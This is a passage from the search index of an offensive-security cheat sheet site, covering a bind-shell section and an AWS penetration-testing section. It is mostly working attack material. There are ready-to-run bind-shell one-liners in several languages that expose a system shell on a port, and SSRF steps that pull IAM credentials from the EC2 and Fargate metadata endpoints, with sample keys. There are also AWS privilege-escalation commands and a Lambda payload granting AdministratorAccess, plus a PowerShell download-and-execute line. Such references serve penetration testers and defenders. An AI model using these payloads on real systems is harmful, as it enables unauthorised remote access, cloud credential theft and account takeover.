GORDON - March 01, 2022</li> <li>Introducing MalSCCM - Phil Keeble -May 4, 2022</li> <li>Certifried: Active Directory Domain Privilege Escalation (CVE-2022\u201326923) - Oliver Lyak</li> <li>bloodyAD and CVE-2022-26923 - soka - 11 May 2022</li> <li>DIVING INTO PRE-CREATED COMPUTER ACCOUNTS - May 10, 2022 - By Oddvar Moe</li> <li>How NOT to use the PAM trust - Leveraging Shadow Principals for Cross Forest Attacks - Thursday, April 18, 2019 - Nikhil SamratAshok Mittal</li> <li>Shadow Credentials - The Hacker Recipes</li> <li>Network Access Accounts are evil\u2026 - ROGER ZANDER - 13 SEP 2015</li> <li>The Phantom Credentials of SCCM: Why the NAA Won\u2019t Die - Duane Michael - Jun 28</li> <li>Diamond tickets - The Hacker Recipes</li> <li>A Diamond (Ticket) in the Ruff - By CHARLIE CLARK July 05, 2022</li> <li>Sapphire tickets - The Hacker Recipes</li> <li>Exploiting RBCD Using a Normal User Account - tiraniddo.dev - Friday, 13 May 2022</li> <li>Exploring SCCM by Unobfuscating Network Access Accounts - @xpn - Posted on 2022-07-09</li> <li>.NET Advanced Code Auditing XmlSerializer Deserialization Vulnerability - April 2, 2019 by znlive</li> <li>Practical guide for Golden SAML - Practical guide step by step to create golden SAML</li> <li>Relaying to AD Certificate Services over RPC - NOVEMBER 16, 2022 - SYLVAIN HEINIGER</li> <li>I AM AD FS AND SO CAN YOU - Douglas Bienstock &amp; Austin Baker - Mandiant</li> <li>Hunt for the gMSA secrets - Dr Nestori Syynimaa (@DrAzureAD) - August 29, 2022</li> <li>Relaying NTLM Authentication from SCCM Clients - Chris Thompson - Jun 30, 2022</li> <li>Poc\u2019ing Beyond Domain Admin - Part 1 - cube0x0</li> <li>At the Edge of Tier Zero: The Curious Case of the RODC - Elad Shamir</li> <li>Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory - Sean Metcalf</li> <li>The Kerberos Key List Attack: The return of the Read Only Domain Controllers - Leandro Cuozzo</li> </ul>"},{"location":"Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet/","title":"Bind Shell","text":""},{"location":"Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet/#summary","title":"Summary","text":"<ul> <li>Bind Shell<ul> <li>Perl</li> <li>Python</li> <li>PHP</li> <li>Ruby</li> <li>Netcat Traditional</li> <li>Netcat OpenBsd</li> <li>Ncat</li> <li>Socat</li> <li>Powershell</li> </ul> </li> </ul>"},{"location":"Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet/#perl","title":"Perl","text":"<pre><code>perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\\\nbind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\\\nclose C){open(STDIN,\"&gt;&amp;C\");open(STDOUT,\"&gt;&amp;C\");open(STDERR,\"&gt;&amp;C\");exec(\"/bin/bash -i\");};'\n</code></pre>"},{"location":"Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet/#python","title":"Python","text":"<p>Single line : <pre><code>python -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",51337));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'\n</code></pre></p> <p>Expanded version :</p> <pre><code>import socket as s,subprocess as sp;\ns1 = s.socket(s.AF_INET, s.SOCK_STREAM);\ns1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1);\ns1.bind((\"0.0.0.0\", 51337));\ns1.listen(1);\nc, a = s1.accept();\nwhile True: \nd = c.recv(1024).decode();\np = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE);\nc.sendall(p.stdout.read()+p.stderr.read())\n</code></pre>"},{"location":"Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet/#php","title":"PHP","text":"<pre><code>php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",51337);\\\nsocket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\"$ \",2))exit;\\\n$in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){$m=fgetc($cmd);\\\n    socket_write($cl,$m,strlen($m));}}'\n</code></pre>"},{"location":"Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet/#ruby","title":"Ruby","text":"<pre><code>ruby -rsocket -e 'f=TCPServer.new(51337);s=f.accept;exec sprintf(\"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",s,s,s)'\n</code></pre>"},{"location":"Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet/#netcat-traditional","title":"Netcat Traditional","text":"<pre><code>nc -nlvp 51337 -e /bin/bash\n</code></pre>"},{"location":"Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet/#netcat-openbsd","title":"Netcat OpenBsd","text":"<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc -lvp 51337 &gt;/tmp/f\n</code></pre>"},{"location":"Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet/#socat","title":"Socat","text":"<pre><code>user@attacker$ socat FILE:`tty`,raw,echo=0 TCP:target.com:12345 \nuser@victim$ socat TCP-LISTEN:12345,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane\n</code></pre>"},{"location":"Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet/#powershell","title":"Powershell","text":"<pre><code>https://github.com/besimorhino/powercat\n# Victim (listen)\n. .\\powercat.ps1\npowercat -l -p 7002 -ep\n# Connect from attacker\n. .\\powercat.ps1\npowercat -c 127.0.0.1 -p 7002\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/","title":"Cloud - AWS","text":"<p>Amazon Web Services offers reliable, scalable, and inexpensive cloud computing services.</p>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#summary","title":"Summary","text":"<ul> <li>AWS</li> <li>Summary</li> <li>Training</li> <li>Tools</li> <li>AWS Patterns</li> <li>AWS - Metadata SSRF<ul> <li>Method for Elastic Cloud Compute (EC2)</li> <li>Method for Container Service (Fargate)</li> <li>AWS API calls that return credentials</li> </ul> </li> <li>AWS - Shadow Admin<ul> <li>Admin equivalent permission</li> </ul> </li> <li>AWS - Gaining AWS Console Access via API Keys</li> <li>AWS - Enumerate IAM permissions</li> <li>AWS - Mount EBS volume to EC2 Linux</li> <li>AWS - Copy EC2 using AMI Image</li> <li>AWS - Instance Connect - Push an SSH key to EC2 instance</li> <li>AWS - Lambda - Extract function's code</li> <li>AWS - SSM - Command execution</li> <li>AWS - Golden SAML Attack</li> <li>AWS - Shadow Copy attack</li> <li>Disable CloudTrail</li> <li>Cover tracks by obfuscating Cloudtrail logs and Guard Duty</li> <li>DynamoDB</li> <li>Security checks</li> <li>AWSome Pentesting Cheatsheet</li> <li>References</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#training","title":"Training","text":"<ul> <li>AWSGoat : A Damn Vulnerable AWS Infrastructure - https://github.com/ine-labs/AWSGoat</li> <li>Damn Vulnerable Cloud Application - https://medium.com/poka-techblog/privilege-escalation-in-the-cloud-from-ssrf-to-global-account-administrator-fd943cf5a2f6</li> <li>SadCloud - https://github.com/nccgroup/sadcloud</li> <li>Flaws - http://flaws.cloud</li> <li>Cloudgoat - https://github.com/RhinoSecurityLabs/cloudgoat</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#tools","title":"Tools","text":"<ul> <li> <p>SkyArk - Discover the most privileged users in the scanned AWS environment, including the AWS Shadow Admins</p> <ul> <li>Requires read-Only permissions over IAM service <pre><code>$ git clone https://github.com/cyberark/SkyArk\n$ powershell -ExecutionPolicy Bypass -NoProfile\nPS C&gt; Import-Module .\\SkyArk.ps1 -force\nPS C&gt; Start-AWStealth\nor in the Cloud Console\nPS C&gt; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cyberark/SkyArk/master/AWStealth/AWStealth.ps1')  \nPS C&gt; Scan-AWShadowAdmins  \n</code></pre></li> </ul> </li> <li> <p>Pacu - Exploit configuration flaws within an AWS environment using an extensible collection of modules with a diverse feature-set</p> <ul> <li>Requires AWS Keys <pre><code>$ git clone https://github.com/RhinoSecurityLabs/pacu\n$ bash install.sh\n$ python3 pacu.py\nset_keys/swap_keys\nls\nrun &lt;module_name&gt; [--keyword-arguments]\nrun &lt;module_name&gt; --regions eu-west-1,us-west-1\n# https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details\n</code></pre></li> </ul> </li> <li> <p>Bucket Finder - Search for public buckets, list and download all files if directory indexing is enabled     <pre><code>wget https://digi.ninja/files/bucket_finder_1.1.tar.bz2 -O bucket_finder_1.1.tar.bz2\n./bucket_finder.rb my_words\n./bucket_finder.rb --region ie my_words\nUS Standard         = http://s3.amazonaws.com\nIreland             = http://s3-eu-west-1.amazonaws.com\nNorthern California = http://s3-us-west-1.amazonaws.com\nSingapore           = http://s3-ap-southeast-1.amazonaws.com\nTokyo               = http://s3-ap-northeast-1.amazonaws.com\n./bucket_finder.rb --download --region ie my_words\n./bucket_finder.rb --log-file bucket.out my_words\n</code></pre></p> </li> <li> <p>Boto3 - Amazon Web Services (AWS) SDK for Python     <pre><code>import boto3\n# Create an S3 client\ns3 = boto3.client('s3',aws_access_key_id='AKIAJQDP3RKREDACTED',aws_secret_access_key='igH8yFmmpMbnkcUaCqXJIRIozKVaREDACTED',region_name='us-west-1')\ntry:\nresult = s3.list_buckets()\nprint(result)\nexcept Exception as e:\nprint(e)\n</code></pre></p> </li> <li> <p>Prowler - AWS security best practices assessments, audits, incident response, continuous monitoring, hardening and forensics readiness</p> <p>It follows guidelines of the CIS Amazon Web Services Foundations Benchmark and DOZENS of additional checks including GDPR and HIPAA (+100).   * Require: arn:aws:iam::aws:policy/SecurityAudit</p> <pre><code>$ pip install awscli ansi2html detect-secrets\n$ git clone https://github.com/toniblyx/prowler\n$ sudo apt install jq\n$ ./prowler -E check42,check43\n$ ./prowler -p custom-profile -r us-east-1 -c check11\n$ ./prowler -A 123456789012 -R ProwlerRole  # sts assume-role\n</code></pre> </li> <li> <p>Principal Mapper - A tool for quickly evaluating IAM permissions in AWS     <pre><code>https://github.com/nccgroup/PMapper\npip install principalmapper\npmapper graph --create\npmapper visualize --filetype png\npmapper analysis --output-type text\n# Determine if PowerUser can escalate privileges\npmapper query \"preset privesc user/PowerUser\"\npmapper argquery --principal user/PowerUser --preset privesc\n# Find all principals that can escalate privileges\npmapper query \"preset privesc *\"\npmapper argquery --principal '*' --preset privesc\n# Find all principals that PowerUser can access\npmapper query \"preset connected user/PowerUser *\"\npmapper argquery --principal user/PowerUser --resource '*' --preset connected\n# Find all principals that can access PowerUser\npmapper query \"preset connected * user/PowerUser\"\npmapper argquery --principal '*' --resource user/PowerUser --preset connected\n</code></pre></p> </li> <li> <p>ScoutSuite - Multi-Cloud Security Auditing Tool     <pre><code>$ git clone https://github.com/nccgroup/ScoutSuite\n$ python scout.py PROVIDER --help\n# The --session-token is optional and only used for temporary credentials (i.e. role assumption).\n$ python scout.py aws --access-keys --access-key-id &lt;AKIAIOSFODNN7EXAMPLE&gt; --secret-access-key &lt;wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY&gt; --session-token &lt;token&gt;\n$ python scout.py azure --cli\n</code></pre></p> </li> <li> <p>s3_objects_check - Whitebox evaluation of effective S3 object permissions, to identify publicly accessible files     <pre><code>$ git clone https://github.com/nccgroup/s3_objects_check\n$ python3 -m venv env &amp;&amp; source env/bin/activate\n$ pip install -r requirements.txt\n$ python s3-objects-check.py -h\n$ python s3-objects-check.py -p whitebox-profile -e blackbox-profile\n</code></pre></p> </li> <li> <p>cloudsplaining - An AWS IAM Security Assessment tool that identifies violations of least privilege and generates a risk-prioritized report     <pre><code>$ pip3 install --user cloudsplaining\n$ cloudsplaining download --profile myawsprofile\n$ cloudsplaining scan --input-file default.json\n</code></pre></p> </li> <li> <p>weirdAAL - AWS Attack Library     <pre><code>python3 weirdAAL.py -m ec2_describe_instances -t demo\npython3 weirdAAL.py -m lambda_get_account_settings -t demo\npython3 weirdAAL.py -m lambda_get_function -a 'MY_LAMBDA_FUNCTION','us-west-2' -t yolo\n</code></pre></p> </li> <li> <p>cloudmapper - CloudMapper helps you analyze your Amazon Web Services (AWS) environments     <pre><code>git clone https://github.com/duo-labs/cloudmapper.git\n# sudo yum install autoconf automake libtool python3-devel.x86_64 python3-tkinter python-pip jq awscli\n# You may additionally need \"build-essential\"\nsudo apt-get install autoconf automake libtool python3.7-dev python3-tk jq awscli\npipenv install --skip-lock\npipenv shell\nreport: Generate HTML report. Includes summary of the accounts and audit findings.\niam_report: Generate HTML report for the IAM information of an account.\naudit: Check for potential misconfigurations.\ncollect: Collect metadata about an account.\nfind_admins: Look at IAM policies to identify admin users and roles, or principals with specific privileges\n</code></pre></p> </li> <li> <p>dufflebag - Find secrets that are accidentally exposed via Amazon EBS's \"public\" mode</p> </li> <li>NetSPI/AWS Consoler - Convert AWS Credentials into a console access</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-patterns","title":"AWS Patterns","text":"Service URL s3 https://{user_provided}.s3.amazonaws.com cloudfront https://{random_id}.cloudfront.net ec2 ec2-{ip-seperated}.compute-1.amazonaws.com es https://{user_provided}-{random_id}.{region}.es.amazonaws.com elb http://{user_provided}-{random_id}.{region}.elb.amazonaws.com:80/443 elbv2 https://{user_provided}-{random_id}.{region}.elb.amazonaws.com rds mysql://{user_provided}.{random_id}.{region}.rds.amazonaws.com:3306 rds postgres://{user_provided}.{random_id}.{region}.rds.amazonaws.com:5432 route 53 {user_provided} execute-api https://{random_id}.execute-api.{region}.amazonaws.com/{user_provided} cloudsearch https://doc-{user_provided}-{random_id}.{region}.cloudsearch.amazonaws.com transfer sftp://s-{random_id}.server.transfer.{region}.amazonaws.com iot mqtt://{random_id}.iot.{region}.amazonaws.com:8883 iot https://{random_id}.iot.{region}.amazonaws.com:8443 iot https://{random_id}.iot.{region}.amazonaws.com:443 mq https://b-{random_id}-{1,2}.mq.{region}.amazonaws.com:8162 mq ssl://b-{random_id}-{1,2}.mq.{region}.amazonaws.com:61617 kafka b-{1,2,3,4}.{user_provided}.{random_id}.c{1,2}.kafka.{region}.amazonaws.com kafka {user_provided}.{random_id}.c{1,2}.kafka.useast-1.amazonaws.com cloud9 https://{random_id}.vfs.cloud9.{region}.amazonaws.com mediastore https://{random_id}.data.mediastore.{region}.amazonaws.com kinesisvideo https://{random_id}.kinesisvideo.{region}.amazonaws.com mediaconvert https://{random_id}.mediaconvert.{region}.amazonaws.com mediapackage https://{random_id}.mediapackage.{region}.amazonaws.com/in/v1/{random_id}/channel"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-metadata-ssrf","title":"AWS - Metadata SSRF","text":"<p>AWS released additional security defences against the attack.</p> <p> Only working with IMDSv1. Enabling IMDSv2 : <code>aws ec2 modify-instance-metadata-options --instance-id &lt;INSTANCE-ID&gt; --profile &lt;AWS_PROFILE&gt; --http-endpoint enabled --http-token required</code>.</p> <p>In order to usr IMDSv2 you must provide a token.</p> <pre><code>export TOKEN=`curl -X PUT -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\" \"http://169.254.169.254/latest/api/token\"`\ncurl -H \"X-aws-ec2-metadata-token:$TOKEN\" -v \"http://169.254.169.254/latest/meta-data\"\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#method-for-elastic-cloud-compute-ec2","title":"Method for Elastic Cloud Compute (EC2)","text":"<p>Example : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/Awesome-WAF-Role/</p> <ol> <li>Access the IAM : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/     <pre><code>ami-id\nami-launch-index\nami-manifest-path\nblock-device-mapping/\nevents/\nhostname\niam/\nidentity-credentials/\ninstance-action\ninstance-id\n</code></pre></li> <li>Find the name of the role assigned to the instance : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/</li> <li>Extract the role's temporary keys : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/Awesome-WAF-Role/     <pre><code>{\n\"Code\" : \"Success\",\n\"LastUpdated\" : \"2019-07-31T23:08:10Z\",\n\"Type\" : \"AWS-HMAC\",\n\"AccessKeyId\" : \"ASIA54BL6PJR37YOEP67\",\n\"SecretAccessKey\" : \"OiAjgcjm1oi2xxxxxxxxOEXkhOMhCOtJMP2\",\n\"Token\" : \"AgoJb3JpZ2luX2VjEDU86Rcfd/34E4rtgk8iKuTqwrRfOppiMnv\",\n\"Expiration\" : \"2019-08-01T05:20:30Z\"\n}\n</code></pre></li> </ol>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#method-for-container-service-fargate","title":"Method for Container Service (Fargate)","text":"<ol> <li>Fetch the AWS_CONTAINER_CREDENTIALS_RELATIVE_URI variable from https://awesomeapp.com/download?file=/proc/self/environ     <pre><code>JAVA_ALPINE_VERSION=8.212.04-r0\nHOSTNAME=bbb3c57a0ed3SHLVL=1PORT=8443HOME=/root\nAWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/d22070e0-5f22-4987-ae90-1cd9bec3f447\nAWS_EXECUTION_ENV=AWS_ECS_FARGATEMVN_VER=3.3.9JAVA_VERSION=8u212AWS_DEFAULT_REGION=us-west-2\nECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/cb4f6285-48f2-4a51-a787-67dbe61c13ffPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin:/usr/lib/mvn:/usr/lib/mvn/binLANG=C.UTF-8AWS_REGION=us-west-2Tag=48111bbJAVA_HOME=/usr/lib/jvm/java-1.8-openjdk/jreM2=/usr/lib/mvn/binPWD=/appM2_HOME=/usr/lib/mvnLD_LIBRARY_PATH=/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64/server:/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64:/usr/lib/jvm/java-1.8-openjd\n</code></pre></li> <li>Use the credential URL to dump the AccessKey and SecretKey : https://awesomeapp.com/forward?target=http://169.254.170.2/v2/credentials/d22070e0-5f22-4987-ae90-1cd9bec3f447     <pre><code>{\n\"RoleArn\": \"arn:aws:iam::953574914659:role/awesome-waf-role\",\n\"AccessKeyId\": \"ASIA54BL6PJR2L75XHVS\",\n\"SecretAccessKey\": \"j72eTy+WHgIbO6zpe2DnfjEhbObuTBKcemfrIygt\",\n\"Token\": \"FQoGZXIvYXdzEMj//////////wEaDEQW+wwBtaoyqH5lNSLGBF3PnwnLYa3ggfKBtLMoWCEyYklw6YX85koqNwKMYrP6ymcjv4X2gF5enPi9/Dx6m/1TTFIwMzZ3tf4V3rWP3HDt1ea6oygzTrWLvfdp57sKj+2ccXI+WWPDZh3eJr4Wt4JkiiXrWANn7Bx3BUj9ZM11RXrKRCvhrxdrMLoewRkWmErNEOFgbaCaT8WeOkzqli4f+Q36ZerT2V+FJ4SWDX1CBsimnDAMAdTIRSLFxVBBwW8171OHiBOYAMK2np1xAW1d3UCcZcGKKZTjBee2zs5+Rf5Nfkoq+j7GQkmD2PwCeAf0RFETB5EVePNtlBWpzfOOVBtsTUTFewFfx5cyNsitD3C2N93WR59LX/rNxyncHGDUP/6UPlasOcfzAaG738OJQmWfQTR0qksHIc2qiPtkstnNndh76is+r+Jc4q3wOWu2U2UBi44Hj+OS2UTpMAwc/MshIiGsUOrBQdPqcLLdAxKpUNTdSQNLg5wv4f2OrOI8/sneV58yBRolBz8DZoH8wohtLXpueDt8jsVSVLznnMOOe/4ehHE2Nt+Fy+tjaY5FUi/Ijdd5IrIdIvWFHY1XcPopUFYrDqr0yuZvX1YddfIcfdbmxf274v69FuuywXTo7cXk1QTMYZWlD/dPI/k6KQeO446UrHT9BJxcJMpchAIVRpI7nVKkSDwku1joKUG7DOeycuAbhecVZG825TocL0ks2yXPnIdvckAaU9DZf+afIV3Nxv3TI4sSX1npBhb2f/8C31pv8VHyu2NiN5V6OOHzZijHsYXsBQ==\",\n\"Expiration\": \"2019-09-18T04:05:59Z\"\n}\n</code></pre></li> </ol>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-api-calls-that-return-credentials","title":"AWS API calls that return credentials","text":"<ul> <li>chime:createapikey</li> <li>codepipeline:pollforjobs</li> <li>cognito-identity:getopenidtoken</li> <li>cognito-identity:getopenidtokenfordeveloperidentity</li> <li>cognito-identity:getcredentialsforidentity</li> <li>connect:getfederationtoken</li> <li>connect:getfederationtokens</li> <li>ecr:getauthorizationtoken</li> <li>gamelift:requestuploadcredentials</li> <li>iam:createaccesskey</li> <li>iam:createloginprofile</li> <li>iam:createservicespecificcredential</li> <li>iam:resetservicespecificcredential</li> <li>iam:updateaccesskey</li> <li>lightsail:getinstanceaccessdetails</li> <li>lightsail:getrelationaldatabasemasteruserpassword</li> <li>rds-db:connect</li> <li>redshift:getclustercredentials</li> <li>sso:getrolecredentials</li> <li>mediapackage:rotatechannelcredentials</li> <li>mediapackage:rotateingestendpointcredentials</li> <li>sts:assumerole</li> <li>sts:assumerolewithsaml</li> <li>sts:assumerolewithwebidentity</li> <li>sts:getfederationtoken</li> <li>sts:getsessiontoken</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-shadow-admin","title":"AWS - Shadow Admin","text":""},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#admin-equivalent-permission","title":"Admin equivalent permission","text":"<ul> <li> <p>AdministratorAccess</p> <pre><code>\"Action\": \"*\"\n\"Resource\": \"*\"\n</code></pre> </li> <li> <p>ec2:AssociateIamInstanceProfile : attach an IAM instance profile to an EC2 instance     <pre><code>aws ec2 associate-iam-instance-profile --iam-instance-profile Name=admin-role --instance-id i-0123456789\n</code></pre></p> </li> <li> <p>iam:CreateAccessKey : create a new access key to another IAM admin account     <pre><code>aws iam create-access-key \u2013user-name target_user\n</code></pre></p> </li> <li> <p>iam:CreateLoginProfile : add a new password-based login profile, set a new password for an entity and impersonate it      <pre><code>$ aws iam create-login-profile \u2013user-name target_user \u2013password '|[3rxYGGl3@`~68)O{,-$1B\u201dzKejZZ.X1;6T}&lt;XT5isoE=LB2L^G@{uK&gt;f;/CQQeXSo&gt;}th)KZ7v?\\\\hq.#@dh49\u2033=fT;|,lyTKOLG7J[qH$LV5U&lt;9`O~Z\u201d,jJ[iT-D^(' \u2013no-password-reset-required\n</code></pre></p> </li> <li> <p>iam:UpdateLoginProfile : reset other IAM users\u2019 login passwords.     <pre><code>$ aws iam update-login-profile \u2013user-name target_user \u2013password '|[3rxYGGl3@`~68)O{,-$1B\u201dzKejZZ.X1;6T}&lt;XT5isoE=LB2L^G@{uK&gt;f;/CQQeXSo&gt;}th)KZ7v?\\\\hq.#@dh49\u2033=fT;|,lyTKOLG7J[qH$LV5U&lt;9`O~Z\u201d,jJ[iT-D^(' \u2013no-password-reset-required\n</code></pre></p> </li> <li> <p>iam:AttachUserPolicy, iam:AttachGroupPolicy or iam:AttachRolePolicy : attach existing admin policy to any other entity he currently possesses     <pre><code>$ aws iam attach-user-policy \u2013user-name my_username \u2013policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n$ aws iam attach-user-policy \u2013user-name my_username \u2013policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n$ aws iam attach-role-policy \u2013role-name role_i_can_assume \u2013policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n</code></pre></p> </li> <li> <p>iam:PutUserPolicy, iam:PutGroupPolicy or iam:PutRolePolicy : added inline policy will allow the attacker to grant additional privileges to previously compromised entities.     <pre><code>$ aws iam put-user-policy \u2013user-name my_username \u2013policy-name my_inline_policy \u2013policy-document file://path/to/administrator/policy.json\n</code></pre></p> </li> <li> <p>iam:CreatePolicy : add a stealthy admin policy</p> </li> <li> <p>iam:AddUserToGroup : add into the admin group of the organization.     <pre><code>$ aws iam add-user-to-group \u2013group-name target_group \u2013user-name my_username\n</code></pre></p> </li> <li> <p>iam:UpdateAssumeRolePolicy + sts:AssumeRole : change the assuming permissions of a privileged role and then assume it with a non-privileged account.     <pre><code>$ aws iam update-assume-role-policy \u2013role-name role_i_can_assume \u2013policy-document file://path/to/assume/role/policy.json\n</code></pre></p> </li> <li> <p>iam:CreatePolicyVersion &amp; iam:SetDefaultPolicyVersion : change customer-managed policies and change a non-privileged entity to be a privileged one.     <pre><code>$ aws iam create-policy-version \u2013policy-arn target_policy_arn \u2013policy-document file://path/to/administrator/policy.json \u2013set-as-default\n$ aws iam set-default-policy-version \u2013policy-arn target_policy_arn \u2013version-id v2\n</code></pre></p> </li> <li> <p>lambda:UpdateFunctionCode : give an attacker access to the privileges associated with the Lambda service role that is attached to that function.     <pre><code>$ aws lambda update-function-code \u2013function-name target_function \u2013zip-file fileb://my/lambda/code/zipped.zip\n</code></pre></p> </li> <li> <p>glue:UpdateDevEndpoint : give an attacker access to the privileges associated with the role attached to the specific Glue development endpoint.     <pre><code>$ aws glue \u2013endpoint-name target_endpoint \u2013public-key file://path/to/my/public/ssh/key.pub\n</code></pre></p> </li> <li> <p>iam:PassRole + ec2:CreateInstanceProfile/ec2:AddRoleToInstanceProfile : an attacker could create a new privileged instance profile and attach it to a compromised EC2 instance that he possesses.</p> </li> <li> <p>iam:PassRole + ec2:RunInstance : give an attacker access to the set of permissions that the instance profile/role has, which again could range from no privilege escalation to full administrator access of the AWS account.     <pre><code># add ssh key\n$ aws ec2 run-instances \u2013image-id ami-a4dc46db \u2013instance-type t2.micro \u2013iam-instance-profile Name=iam-full-access-ip \u2013key-name my_ssh_key \u2013security-group-ids sg-123456\n# execute a reverse shell\n$ aws ec2 run-instances \u2013image-id ami-a4dc46db \u2013instance-type t2.micro \u2013iam-instance-profile Name=iam-full-access-ip \u2013user-data file://script/with/reverse/shell.sh\n</code></pre></p> </li> <li> <p>iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction : give a user access to the privileges associated with any Lambda service role that exists in the account.     <pre><code>$ aws lambda create-function \u2013function-name my_function \u2013runtime python3.6 \u2013role arn_of_lambda_role \u2013handler lambda_function.lambda_handler \u2013code file://my/python/code.py\n$ aws lambda invoke \u2013function-name my_function output.txt\n</code></pre>     Example of code.py     <pre><code>import boto3\ndef lambda_handler(event, context):\nclient = boto3.client('iam')\nresponse = client.attach_user_policy(\nUserName='my_username',\nPolicyArn=\"arn:aws:iam::aws:policy/AdministratorAccess\"\n)\nreturn response\n</code></pre></p> </li> <li> <p>iam:PassRole + glue:CreateDevEndpoint : access to the privileges associated with any Glue service role that exists in the account.     <pre><code>$ aws glue create-dev-endpoint \u2013endpoint-name my_dev_endpoint \u2013role-arn arn_of_glue_service_role \u2013public-key file://path/to/my/public/ssh/key.pub\n</code></pre></p> </li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-gaining-aws-console-access-via-api-keys","title":"AWS - Gaining AWS Console Access via API Keys","text":"<p>A utility to convert your AWS CLI credentials into AWS console access.</p> <pre><code>$&gt; git clone https://github.com/NetSPI/aws_consoler\n$&gt; aws_consoler -v -a AKIA[REDACTED] -s [REDACTED]\n2020-03-13 19:44:57,800 [aws_consoler.cli] INFO: Validating arguments...\n2020-03-13 19:44:57,801 [aws_consoler.cli] INFO: Calling logic.\n2020-03-13 19:44:57,820 [aws_consoler.logic] INFO: Boto3 session established.\n2020-03-13 19:44:58,193 [aws_consoler.logic] WARNING: Creds still permanent, creating federated session.\n2020-03-13 19:44:58,698 [aws_consoler.logic] INFO: New federated session established.\n2020-03-13 19:44:59,153 [aws_consoler.logic] INFO: Session valid, attempting to federate as arn:aws:sts::123456789012:federated-user/aws_consoler.\n2020-03-13 19:44:59,668 [aws_consoler.logic] INFO: URL generated!\nhttps://signin.aws.amazon.com/federation?Action=login&amp;Issuer=consoler.local&amp;Destination=https%3A%2F%2Fconsole.aws.amazon.com%2Fconsole%2Fhome%3Fregion%3Dus-east-1&amp;SigninToken=[REDACTED\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-enumerate-iam-permissions","title":"AWS - Enumerate IAM permissions","text":"<p>Enumerate the permissions associated with AWS credential set with enumerate-iam</p> <pre><code>git clone git@github.com:andresriancho/enumerate-iam.git\npip install -r requirements.txt\n./enumerate-iam.py --access-key AKIA... --secret-key StF0q...\n2019-05-10 15:57:58,447 - 21345 - [INFO] Starting permission enumeration for access-key-id \"AKIA...\"\n2019-05-10 15:58:01,532 - 21345 - [INFO] Run for the hills, get_account_authorization_details worked!\n2019-05-10 15:58:01,537 - 21345 - [INFO] -- {\n\"RoleDetailList\": [\n{\n\"Tags\": [],\n\"AssumeRolePolicyDocument\": {\n\"Version\": \"2008-10-17\",\n\"Statement\": [\n{\n...\n2019-05-10 15:58:26,709 - 21345 - [INFO] -- gamelift.list_builds() worked!\n2019-05-10 15:58:26,850 - 21345 - [INFO] -- 